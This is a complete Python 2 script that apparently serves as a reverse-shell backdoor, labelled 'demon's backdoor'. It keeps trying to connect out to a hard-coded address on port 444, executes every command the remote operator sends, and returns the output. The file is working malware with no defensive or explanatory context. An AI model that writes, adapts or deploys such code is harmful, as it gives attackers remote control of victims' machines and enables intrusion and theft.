#!/usr/bin/python
#coding:utf-8

import socket 
import sys
import commands
from time import sleep
from thread import *

HOST = "192.168.10.24"
PORT = 444


def clientthread(s):
    global isConnect
    s.send("Welcome demon's backdoor!".center(50,"*") + "\n")

    while 1:
        s.send("Demon_Backdoor# ")
        data = s.recv(1024)
        if data :
            cmd = data.strip("\n")
            code,res = commands.getstatusoutput(cmd)

            if code == 0 :
                s.sendall(res+"\n")
            else:
                print "[-]Error: code",code
            data = ""
        else:
            break


while 1:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))
        print "[+] connecting" , HOST + ":", PORT
        clientthread(s)
        #start_new_thread(clientthread, (s,))
        s.close()
    except:
        sleep(0.5)


